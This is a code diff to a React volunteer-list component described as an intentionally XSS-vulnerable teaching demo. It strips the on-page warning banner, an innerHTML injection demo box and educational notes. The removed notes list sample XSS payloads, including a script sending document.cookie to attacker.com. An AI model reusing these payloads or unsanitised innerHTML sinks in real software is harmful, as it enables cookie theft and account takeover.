@@ -6,7 +6,7 @@ import { useInView } from "react-intersection-observer"
 import useSWR from "swr"
 import axios from "axios"
 import { useTranslation } from "react-i18next"
-import { Search, Users, UserRound, X, Calendar, AlertTriangle } from "lucide-react"
+import { Search, Users, UserRound, X, Calendar } from "lucide-react"
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
 import { Badge } from "@/components/ui/badge"
@@ -15,7 +15,6 @@ import { Button } from "@/components/ui/button"
 import { Skeleton } from "@/components/ui/skeleton"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
-import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
 
 // ⚠️ WARNING: EDUCATIONAL PURPOSE ONLY ⚠️
 // This code is intentionally vulnerable to XSS attacks for educational purposes.
@@ -258,15 +257,6 @@ const VolunteerList = () => {
   return (
     <section ref={ref} className="py-16 px-4 md:px-8 bg-background">
       <div className="container max-w-6xl mx-auto">
-        <Alert variant="destructive" className="mb-6">
-          <AlertTriangle className="h-4 w-4" />
-          <AlertTitle>Warning: Educational XSS Demo</AlertTitle>
-          <AlertDescription>
-            This page contains intentional XSS vulnerabilities for educational purposes. Any JavaScript in the data will
-            execute. Never use this code in production.
-          </AlertDescription>
-        </Alert>
-
         <motion.div
           initial={{ opacity: 0, y: -20 }}
           animate={{ opacity: inView ? 1 : 0, y: inView ? 0 : -20 }}
@@ -643,75 +633,6 @@ const VolunteerList = () => {
             </Card>
           </motion.div>
         )}
-      </div>
-
-      {/* ⚠️ XSS VULNERABILITY: This demonstrates DOM-based XSS */}
-      <div className="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-md">
-        <h3 className="text-lg font-medium mb-2">XSS Vulnerability Demo (Educational Only)</h3>
-        <p className="mb-2">Enter HTML with script tags below to see XSS in action:</p>
-        <div className="flex gap-2">
-          <Input type="text" placeholder={"Try: <img src=x onerror=\"alert('XSS Demo')\">"} id="xss-demo-input" />
-          <Button
-            onClick={() => {
-              const input = document.getElementById("xss-demo-input").value
-              document.getElementById("xss-demo-output").innerHTML = input
-            }}
-          >
-            Execute
-          </Button>
-        </div>
-        <div className="mt-4 p-4 bg-white border rounded-md">
-          <div id="xss-demo-output"></div>
-        </div>
-      </div>
-
-      {/* Educational notes about XSS vulnerabilities */}
-      <div className="mt-8 p-6 bg-red-50 border border-red-200 rounded-md">
-        <h2 className="text-xl font-bold mb-4">⚠️ Educational Notes: XSS Vulnerabilities</h2>
-        <p className="mb-4">
-          This code contains multiple Cross-Site Scripting (XSS) vulnerabilities for educational purposes:
-        </p>
-
-        <ol className="list-decimal pl-6 space-y-2">
-          <li>
-            Using <code>dangerouslySetInnerHTML</code> without sanitization
-          </li>
-          <li>Direct manipulation of innerHTML with user input</li>
-          <li>Using eval() on URL parameters</li>
-          <li>Insufficient HTML tag cleaning</li>
-          <li>Rendering user input directly in the DOM</li>
-        </ol>
-
-        <div className="mt-4 p-4 bg-white rounded-md">
-          <h3 className="font-bold mb-2">Example XSS Payloads:</h3>
-          <ul className="list-disc pl-6 space-y-1">
-            <li>
-              <code>&lt;img src="x" onerror="alert('XSS')" /&gt;</code>
-            </li>
-            <li>
-              <code>&lt;script&gt;fetch('https://attacker.com?cookie='+document.cookie)&lt;/script&gt;</code>
-            </li>
-            <li>
-              <code>&lt;div onmouseover="alert('Hovered')"&gt;Hover me&lt;/div&gt;</code>
-            </li>
-            <li>
-              <code>javascript:alert(document.domain)</code>
-            </li>
-          </ul>
-        </div>
-
-        <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-md">
-          <h3 className="font-bold mb-2">How to Fix These Vulnerabilities:</h3>
-          <ol className="list-decimal pl-6 space-y-1">
-            <li>Use a proper HTML sanitization library like DOMPurify</li>
-            <li>Never use eval() or Function() constructors with user input</li>
-            <li>Validate and sanitize all user inputs</li>
-            <li>Use textContent instead of innerHTML when possible</li>
-            <li>Implement Content Security Policy (CSP) headers</li>
-          </ol>
-        </div>
-
-        <p className="mt-4 font-bold text-red-600">NEVER use this code in production environments!</p>
       </div>
     </section>
   )
